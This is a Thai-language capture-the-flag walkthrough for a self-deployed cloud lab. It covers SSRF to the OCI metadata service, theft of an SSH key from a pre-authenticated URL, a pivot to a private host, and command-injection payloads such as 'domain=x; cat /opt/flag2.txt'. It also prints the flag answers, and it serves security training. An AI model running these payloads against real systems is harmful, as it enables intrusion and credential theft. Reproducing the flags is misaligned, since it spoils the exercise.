# CloudBreach Range — คู่มือเล่นแบบละเอียด (ภาษาไทย)

Target จริงบน OCI ไม่ใช่ mock — ทุกคำสั่งด้านล่างยิงใส่ instance จริง แก้ปัญหาจริง
ไม่ใช่ transcript ตัวอย่าง

**Target ปัจจุบัน:** `https://soulsecure.duckdns.org/` (IP นี้เป็น
Reserved Public IP แล้ว ไม่เปลี่ยนอีก — ดู [InstructorKey.md](InstructorKey.md)
ถ้าอยากรู้เหตุผล)

**มี 2 ช่องโหว่แยกอิสระกัน** บนหน้า "Staff Tools" เดียวกัน — ไปจบที่เป้าหมาย
เดียวกัน (`internal-01`) แต่คนละเส้นทางจริงๆ ไม่ใช่ช่องโหว่เดียวกันแค่ทำ 2 รอบ
คู่มือนี้เขียนเฉพาะ **Chain A (SSRF)** เต็มรูปแบบ ส่วน **Chain B (Command
Injection)** สรุปย่อไว้ท้ายไฟล์ — เหมาะสำหรับให้สมาชิกในทีมคนละคนทำคนละ chain
กัน จะได้ไม่ซ้ำ

---

## สถานการณ์

SoulSecure Inc. (บริษัท cybersecurity เดียวกับที่ทำคอร์ส SoulSecure) มีเว็บไซต์
สาธารณะของตัวเอง เป้าหมาย: หา initial access จากหน้าเว็บสาธารณะ ไปจนถึงได้ shell
บนเครื่องที่สอง (`internal-01`) ที่ **ไม่มี public IP เลย** — ต้อง pivot ผ่าน
เครื่องแรกเท่านั้นถึงจะไปถึง

---

## ขั้นที่ 0: Recon

```bash
nmap -sV -p- soulsecure.duckdns.org
curl -s https://soulsecure.duckdns.org/
```

จะเจอเว็บบริษัท security ธรรมดา — Home / About / Team / Work — เดินดูให้ทั่ว
สังเกตลิงก์ **"Staff Tools"** ที่มุมล่างของทุกหน้า (footer) นั่นคือจุดเริ่ม

## ขั้นที่ 1: เจอ internal tool ที่มีช่องโหว่

```bash
curl -s https://soulsecure.duckdns.org/staff
```

จะเจอเครื่องมือชื่อ **"Report Link Preview"** — ให้พนักงานวางลิงก์เพื่อ preview
ก่อนใส่ลงรายงานลูกค้า ทำงานที่ `/preview?url=...`

ลองใช้งานปกติดูก่อน:
```bash
curl -s "https://soulsecure.duckdns.org/preview?url=https://example.com"
```

จะเห็นว่ามัน fetch URL แล้วโชว์ผลกลับมา — **เซิร์ฟเวอร์เป็นคนยิง request เอง**
(SSRF) และมี parameter `headers=` ให้ใส่ custom header เป็น JSON ได้ด้วย

## ขั้นที่ 2: ใช้ SSRF เข้าถึง OCI instance metadata

ทุก cloud instance (AWS/OCI/GCP) มี metadata service อยู่ที่ IP พิเศษตายตัว
`169.254.169.254` — ลองยิงผ่านเครื่องมือ preview:

```bash
curl -sG "https://soulsecure.duckdns.org/preview" \
  --data-urlencode "url=http://169.254.169.254/opc/v2/instance/"
```

จะเจอ error บอกว่าต้องมี header บางอย่าง — OCI IMDS v2 ต้องการ
`Authorization: Bearer Oracle` (เป็นค่าตายตัว ไม่ใช่ secret เฉพาะ session
เหมือน AWS) ใส่ผ่าน `headers=` ที่เครื่องมือรองรับอยู่แล้ว:

```bash
curl -sG "https://soulsecure.duckdns.org/preview" \
  --data-urlencode "url=http://169.254.169.254/opc/v2/instance/metadata/" \
  --data-urlencode 'headers={"Authorization":"Bearer Oracle"}'
```

## ขั้นที่ 3: เจอ secret ที่ทีม ops ฝากไว้ใน metadata

ผลลัพธ์จากขั้นที่แล้วจะมี custom metadata 2 ตัว:
```json
{
  "backup_recovery_url": "https://objectstorage.ap-tokyo-1.oraclecloud.com/p/<token>/n/<namespace>/b/cloudbreach-secrets/o/internal01-ssh-key.pem",
  "backup_recovery_notes": "Meridian ops: internal-01 recovery key, rotate quarterly per ticket MERI-4471"
}
```

`backup_recovery_url` คือ **Pre-Authenticated Request (PAR)** ของ OCI —
เทียบเท่า presigned URL ของ S3 — ใช้ได้เลยโดยไม่ต้อง authenticate เพิ่ม:

```bash
curl -s "<backup_recovery_url ที่ได้มา>" -o internal01_key.pem
chmod 600 internal01_key.pem
cat internal01_key.pem   # ควรเป็น RSA private key จริง
```

## ขั้นที่ 4: หา IP ของ internal-01

`internal-01` ไม่มี public IP ต้องเดา/สแกนจากใน subnet — private subnet range
คือ `10.0.2.0/24` (ดูได้จาก `terraform/network.tf` ถ้ามีสิทธิ์เข้าถึงซอร์ส)
ในทางปฏิบัติ (สำหรับ lab นี้) IP คือ `10.0.2.203`

## ขั้นที่ 5: Pivot เข้า internal-01

`web-01` มี admin SSH เปิดไว้ (ไม่ใช่ทางที่ตั้งใจให้เจาะ) เรา "อยู่บน" web-01
แล้วในทางทฤษฎี (ผ่านการเข้าถึงระดับแอปที่ได้จาก SSRF) — ในทางปฏิบัติของ lab นี้
ให้ทดสอบ pivot ผ่าน SSH ProxyJump จากเครื่องคุณเอง โดยใช้ key ที่ขโมยมา:

```bash
# อัปโหลด key ไปที่ web-01 ก่อน (ในสถานการณ์จริง คุณมี shell บน web-01 อยู่แล้ว)
scp -i <your-key> internal01_key.pem ubuntu@soulsecure.duckdns.org:~/

ssh -i <your-key> ubuntu@soulsecure.duckdns.org \
  "chmod 600 ~/internal01_key.pem && ssh -o StrictHostKeyChecking=no -i ~/internal01_key.pem ubuntu@10.0.2.203 'cat /home/ubuntu/flag.txt'"
```

## ขั้นที่ 6: Flag

```
flag{fd16978f423c836c563079917db6978a}
```

พร้อม note เพิ่มเติมที่ `/opt/meridian-internal/customer-export-notice.txt`
บน `internal-01` (อ่านเพื่อความสมบูรณ์ของรายงาน)

---

## Chain B (สรุปย่อ): Command Injection → RCE จริง

คนละช่องโหว่กับด้านบน อยู่ที่เครื่องมือ **"Domain Intel Lookup"** บนหน้า
Staff Tools เดียวกัน (`/tools/lookup?domain=...`) — รับ domain มาแล้วรัน
`whois` ผ่าน `shell=True` โดยไม่กรอง input เลย

### ขั้น B1: ยืนยันว่า inject ได้จริง
```bash
curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
  --data-urlencode "domain=example.com; id"
```
ผลลัพธ์จะมีทั้ง output ของ `whois` **และ** output ของ `id` — พิสูจน์ว่ารัน
คำสั่งที่สองได้จริง

### ขั้น B2: เช็คว่าเป็น root
```bash
curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
  --data-urlencode "domain=x; whoami"
# ควรได้ root -- แอปนี้รันเป็น root จริง (misconfiguration ที่ตั้งใจเก็บไว้)
```

### ขั้น B3: Flag 2
```bash
curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
  --data-urlencode "domain=x; cat /opt/flag2.txt"
# flag{e2f73445060fd21acbe97b6794dfbea2}
```

### ขั้น B4: ไปต่อถึง internal-01 แบบเส้นทางอ้อม (ไม่ต้องใช้ SSRF header trick แล้ว)
เพราะตอนนี้มี shell จริงแล้ว ไม่ต้องพึ่ง `headers=` param ของ `/preview`
รัน `curl` เองตรงๆ ได้เลย:
```bash
curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
  --data-urlencode 'domain=x; curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/metadata/backup_recovery_url'
```
จะได้ `backup_recovery_url` ตัวเดียวกับ Chain A — จากนี้ทำขั้นที่ 3-6 ด้านบน
ต่อได้เลย (ดาวน์โหลด key, หา IP `internal-01`, pivot, อ่าน flag) จบที่ flag
เดียวกัน: `flag{fd16978f423c836c563079917db6978a}`

ดูเฉลยเต็มของ Chain B (พร้อม remediation/rubric) ที่
[InstructorKey.md](InstructorKey.md) หัวข้อ "Chain B"

---

## สรุป kill chain แบบย่อ

```
SSRF (/preview) 
  → Bearer Oracle header bypass → OCI instance metadata (169.254.169.254)
  → เจอ backup_recovery_url (PAR ที่ฝากไว้ผิดที่)
  → ดาวน์โหลด SSH private key จริงของ internal-01
  → SSH pivot ผ่าน web-01 เข้า internal-01 (private subnet, ไม่มี public IP)
  → flag
```

## ทำไม chain นี้ถึง "สมจริง" ไม่ใช่แค่โจทย์ lab

- SSRF + header-forwarding เป็น feature จริงที่เครื่องมือ "link preview" จำนวนมากมี
- Metadata service ที่ `169.254.169.254` เป็นของจริง ใช้ IP เดียวกันทั้ง AWS/OCI/GCP
- OCI IMDS v2's header requirement (`Bearer Oracle`) เป็นค่าคงที่สาธารณะ — เป็นการ
  ป้องกัน SSRF ที่อ่อนกว่า AWS IMDSv2 (ที่ต้องใช้ token เฉพาะ session) จริงๆ
- การฝาก presigned URL ไว้ใน instance metadata เป็นความผิดพลาดที่ทีม ops จริง
  ทำกันบ่อย (documented pattern ในหลาย incident writeup จริง)

## ก่อนเล่น

- ต้องเป็นเครื่องที่คุณ deploy เอง (ดู [README.md](README.md)) — `allowed_cidr`
  ต้องตรงกับ IP ของคุณก่อนถึงจะยิง port 22/443 ได้ (ยกเว้น port 80 ที่เปิด
  สาธารณะไว้เพื่อ Let's Encrypt เท่านั้น)
- ดูเฉลยเต็มพร้อมคำสั่งจริงทุกบรรทัดได้ที่ [InstructorKey.md](InstructorKey.md)
